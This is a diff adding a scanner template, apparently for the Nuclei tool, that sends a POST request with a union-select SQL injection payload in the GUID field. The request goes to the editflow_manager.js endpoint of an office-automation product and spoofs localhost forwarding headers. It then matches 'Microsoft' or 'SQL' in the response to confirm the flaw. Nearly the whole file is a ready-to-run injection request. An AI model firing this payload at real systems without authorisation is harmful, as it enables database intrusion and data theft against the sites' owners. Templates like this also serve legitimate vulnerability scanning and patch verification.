@@ -1,0 +1,29 @@
+id: fe-editflow_manager-sql
+
+info:
+  name: fe-editflow_manager-sql
+  author: fe-editflow_manager-sql
+
+requests:
+  - raw:
+      - |
+        POST /sysform/003/editflow_manager.js%70 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        X-Forwarded-For: 127.0.0.1
+        X-Originating-IP: 127.0.0.1
+        X-Remote-Addr: 127.0.0.1
+        X-Remote-IP: 127.0.0.1
+        Connection: close
+        Content-Type: application/x-www-form-urlencoded
+        
+        option=2&GUID=-1%27+union+select+%40%40version--+
+
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "(contains(body,'Microsoft') && status_code==200) || (contains(body,'SQL') && status_code==200)"
+
